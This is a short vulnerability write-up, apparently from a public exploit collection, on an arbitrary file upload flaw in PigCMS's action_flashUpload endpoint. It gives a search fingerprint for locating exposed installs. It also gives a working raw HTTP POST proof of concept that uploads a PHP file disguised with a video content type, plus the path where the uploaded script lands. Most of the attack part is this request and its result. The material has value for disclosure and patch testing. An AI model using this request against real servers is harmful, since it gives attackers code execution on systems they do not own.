# PigCMS action_flashUpload any file upload vulnerability

## Vulnerability Description

There is a vulnerability to upload any file in the PigCMS action_flashUpload method. The attacker can upload any file to obtain server permissions through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">pigcms</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app.name="PigCMS"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1691722982834-8391fb00-7582-4fc7-95c5-2ebb2c4dcde6.png)

Verify POC

```php
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv

<?php phpinfo();?>
------aaa
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1691723050483-3c961b57-f018-46c5-a6e0-db9af809d26f.png)

```php
/cms/upload/images/2023/08/11/1691722887xXbx.php
```